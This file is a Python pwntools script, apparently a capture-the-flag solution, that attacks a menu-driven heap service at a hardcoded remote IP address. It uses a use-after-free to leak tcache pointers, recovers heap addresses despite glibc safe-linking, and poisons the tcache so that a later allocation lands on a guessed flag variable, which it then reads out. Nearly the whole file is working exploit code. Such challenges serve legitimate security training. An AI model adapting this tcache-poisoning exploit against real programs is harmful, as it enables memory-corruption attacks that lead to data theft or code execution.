#!/usr/bin/env python3
"""
Test basic tcache functionality
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = b''
    while len(data) < size:
        chunk = p.recv(size - len(data), timeout=2)
        if not chunk:
            break
        data += chunk
    p.recv(1)  # trailing newline
    return data

p = connect()
p.recvuntil(b'> ')
log.info("Connected")

# Test 1: Basic tcache - create, banish, create again
log.info("=== Test 1: Basic tcache ===")
create(p, 0, 0x80, b'AAAA\n')
banish(p, 0)
data = recite(p, 0, 0x80)
fd = u64(data[0:8])
log.info(f"fd = {hex(fd)}")
spell_addr = fd << 12
log.info(f"spell_addr (from fd) = {hex(spell_addr)}")

# Create again - should reuse the same address
create(p, 1, 0x80, b'BBBB\n')
data = recite(p, 0, 0x80)  # UAF read on spell 0
if b'BBBB' in data:
    log.success("Tcache works! Spell 1 reused spell 0's address")
else:
    log.error(f"Tcache broken! Data: {data[:32].hex()}")

# Test 2: Edit UAF - overwrite fd and verify
log.info("\n=== Test 2: Edit UAF ===")
banish(p, 0)
banish(p, 1)
data = recite(p, 1, 0x80)
fd1 = u64(data[0:8])
log.info(f"spell1 fd = {hex(fd1)}")

# spell1 is head, spell0 is next
# spell1->fd = (spell1>>12) ^ spell0
# We want to verify by reading spell0's fd too
data0 = recite(p, 0, 0x80)
fd0 = u64(data0[0:8])
log.info(f"spell0 fd = {hex(fd0)}")
# spell0->fd = spell0>>12 (since tcache was empty when spell0 was freed first)
spell0_addr = fd0 << 12
log.info(f"spell0_addr = {hex(spell0_addr)}")

# spell1>>12 = fd1 ^ spell0_addr
spell1_shifted = fd1 ^ spell0_addr
spell1_addr = spell1_shifted << 12
log.info(f"spell1_addr = {hex(spell1_addr)}")
log.info(f"diff = {hex(spell1_addr - spell0_addr)}")

# Now try the poisoning
# Write g_flag_addr to spell1->fd
# g_flag should be at spell0 - 0x90
g_flag_addr = spell0_addr - 0x90
log.info(f"g_flag_addr (guess) = {hex(g_flag_addr)}")

protected = (spell1_addr >> 12) ^ g_flag_addr
log.info(f"protected = {hex(protected)}")
payload = p64(protected) + b'\x00' * (0x80 - 8)
edit(p, 1, 0x80, payload)

# Allocate - first returns spell1, second should return g_flag
log.info("Allocating spell 2...")
try:
    create(p, 2, 0x80, b'C\n')
    log.info("Spell 2 created OK")
except:
    log.error("Failed to create spell 2")
    p.close()
    exit(1)

log.info("Allocating spell 3 (should be at g_flag)...")
try:
    create(p, 3, 0x80, b'\n')
    log.info("Spell 3 created OK")
    data = recite(p, 3, 0x80)
    log.info(f"Spell 3 data: {data[:64].hex()}")
    # Check for flag
    if b'flag' in data.lower() or b'{' in data:
        log.success(f"FOUND FLAG: {data}")
except Exception as e:
    log.error(f"Failed: {e}")

p.sendline(b'0')
p.close()
